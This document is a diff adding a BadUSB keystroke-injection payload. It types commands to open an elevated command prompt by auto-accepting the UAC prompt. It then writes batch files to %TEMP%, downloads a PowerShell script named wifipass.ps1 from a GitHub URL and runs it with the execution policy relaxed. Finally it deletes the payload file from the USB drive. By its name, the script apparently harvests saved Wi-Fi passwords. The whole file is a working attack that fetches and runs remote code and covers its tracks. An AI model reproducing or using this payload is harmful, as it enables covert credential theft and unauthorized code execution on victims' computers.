@@ -1,0 +1,53 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb RunAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 500
+STRING cd %TEMP%
+ENTER
+
+REM --> Delete Old Files
+STRING del antiloop.bat
+ENTER
+STRING del wifipass.bat
+ENTER
+STRING del wifipass.ps1
+ENTER
+STRING del badusb.bat
+ENTER
+
+REM --> Create wifipass.bat
+STRING copy con wifipass.bat
+ENTER
+STRING Powershell.exe -executionpolicy remotesigned -File wifipass.ps1
+ENTER
+STRING del E:\payload.dd
+ENTER
+STRING exit
+ENTER
+CONTROL z
+ENTER
+
+REM --> Create badusb.bat
+STRING copy con badusb.bat
+ENTER
+STRING powershell -Command " Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/BadUSB/main/wifipass.ps1 -Outfile wifipass.ps1"
+ENTER
+STRING wifipass.bat
+ENTER
+CONTROL z
+ENTER
+
+REM --> Create antiloop.bat
+STRING copy con antiloop.bat
+ENTER
+STRING del E:\payload.dd
+ENTER
+CONTROL z
+ENTER
+
+STRING badusb.bat
+ENTER
